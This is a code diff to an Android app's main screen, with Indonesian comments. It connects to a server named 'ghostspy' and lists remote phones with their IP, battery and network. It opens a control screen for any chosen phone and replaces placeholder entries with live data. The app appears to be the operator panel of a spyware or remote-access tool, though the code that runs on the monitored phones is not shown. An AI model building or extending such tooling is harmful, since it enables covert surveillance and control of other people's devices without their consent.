@@ -4,11 +4,14 @@ import android.app.Activity;
 import android.content.Intent;
 import android.os.Bundle;
 import android.view.View;
-import android.widget.LinearLayout;
-import android.widget.TextView;
+import android.widget.*;
 import io.socket.client.IO;
 import io.socket.client.Socket;
+import org.json.JSONArray;
+import org.json.JSONObject;
 import java.net.URISyntaxException;
+import java.util.ArrayList;
+import java.util.List;
 
 public class MainActivity extends Activity {
     private Socket socket;
@@ -24,7 +27,6 @@ public class MainActivity extends Activity {
         deviceContainer = findViewById(R.id.deviceContainer);
         statusText.setText("⏳ Menghubungkan...");
 
-        // Inisialisasi socket dengan try-catch
         try {
             socket = IO.socket("https://ghostspy.bruang.biz.id");
         } catch (URISyntaxException e) {
@@ -32,54 +34,92 @@ public class MainActivity extends Activity {
             return;
         }
 
-        // Event: terhubung
         socket.on(Socket.EVENT_CONNECT, args -> {
-            runOnUiThread(() -> statusText.setText("🟢 ONLINE"));
+            runOnUiThread(() -> {
+                statusText.setText("🟢 ONLINE");
+                socket.emit("get_devices");
+            });
         });
 
-        // Event: gagal konek
+        socket.on("devices_list", args -> {
+            try {
+                JSONArray devices = (JSONArray) args[0];
+                List<String[]> list = new ArrayList<>();
+                for (int i = 0; i < devices.length(); i++) {
+                    JSONObject d = devices.getJSONObject(i);
+                    list.add(new String[]{
+                        d.getString("id"),
+                        d.getString("model"),
+                        d.optString("android", "?"),
+                        d.optString("ip", ""),
+                        d.optString("last_seen", ""),
+                        d.optString("battery", "?"),
+                        d.optString("network", "?")
+                    });
+                }
+                runOnUiThread(() -> {
+                    deviceContainer.removeAllViews();
+                    if (list.isEmpty()) {
+                        statusText.setText("🟢 ONLINE | 0 perangkat");
+                        return;
+                    }
+                    for (String[] data : list) {
+                        // Kartu premium
+                        LinearLayout card = new LinearLayout(MainActivity.this);
+                        card.setOrientation(LinearLayout.VERTICAL);
+                        card.setBackgroundColor(0xFF1A1A2E);
+                        card.setPadding(24, 20, 24, 20);
+                        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
+                                LinearLayout.LayoutParams.MATCH_PARENT,
+                                LinearLayout.LayoutParams.WRAP_CONTENT);
+                        lp.setMargins(0, 0, 0, 16);
+                        card.setLayoutParams(lp);
+                        // Efek border manual (garis tipis)
+                        card.setBackground(getDrawable(R.drawable.card_border));
+
+                        TextView idView = new TextView(MainActivity.this);
+                        idView.setText("🆔 " + data[0]);
+                        idView.setTextColor(0xFFFF1E5A);
+                        idView.setTextSize(16);
+                        idView.setTypeface(null, android.graphics.Typeface.BOLD);
+
+                        TextView modelView = new TextView(MainActivity.this);
+                        modelView.setText("📱 " + data[1] + " | " + data[2]);
+                        modelView.setTextColor(0xFFFFFFFF);
+                        modelView.setTextSize(15);
+
+                        TextView infoView = new TextView(MainActivity.this);
+                        infoView.setText("IP: " + data[3] + " | Bat: " + data[5] + "% | " + data[6]);
+                        infoView.setTextColor(0xFF9AA3B2);
+                        infoView.setTextSize(12);
+
+                        card.addView(idView);
+                        card.addView(modelView);
+                        card.addView(infoView);
+
+                        card.setOnClickListener(v -> {
+                            Intent i = new Intent(MainActivity.this, ControlActivity.class);
+                            i.putExtra("deviceId", data[0]);
+                            i.putExtra("deviceModel", data[1]);
+                            i.putExtra("battery", data[5]);
+                            i.putExtra("network", data[6]);
+                            startActivity(i);
+                        });
+
+                        deviceContainer.addView(card);
+                    }
+                    statusText.setText("🟢 ONLINE | " + list.size() + " perangkat");
+                });
+            } catch (Exception e) {
+                runOnUiThread(() -> statusText.setText("⚠️ Parse error"));
+            }
+        });
+
         socket.on(Socket.EVENT_CONNECT_ERROR, args -> {
             runOnUiThread(() -> statusText.setText("🔴 OFFLINE"));
         });
 
         socket.connect();
-
-        // Tampilkan 2 device dummy dulu
-        addDeviceCard("REALME RMX3939 ANDROID 15", "192.168.1.5", true);
-        addDeviceCard("REDMI 23053RN02A ANDROID 15", "10.0.0.12", false);
-    }
-
-    private void addDeviceCard(String model, String ip, boolean online) {
-        LinearLayout card = new LinearLayout(this);
-        card.setOrientation(LinearLayout.VERTICAL);
-        card.setBackgroundColor(0xFF1A1A2E);
-        card.setPadding(20, 20, 20, 20);
-        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
-                LinearLayout.LayoutParams.MATCH_PARENT,
-                LinearLayout.LayoutParams.WRAP_CONTENT);
-        lp.setMargins(0, 0, 0, 12);
-        card.setLayoutParams(lp);
-
-        TextView modelView = new TextView(this);
-        modelView.setText("📱 " + model);
-        modelView.setTextColor(0xFFFFFFFF);
-        modelView.setTextSize(16);
-
-        TextView ipView = new TextView(this);
-        ipView.setText("IP: " + ip + (online ? " 🟢" : " 🔴"));
-        ipView.setTextColor(0xFF9AA3B2);
-        ipView.setTextSize(12);
-
-        card.addView(modelView);
-        card.addView(ipView);
-
-        card.setOnClickListener(v -> {
-            Intent i = new Intent(this, ControlActivity.class);
-            i.putExtra("deviceId", model);
-            startActivity(i);
-        });
-
-        deviceContainer.addView(card);
     }
 
     @Override
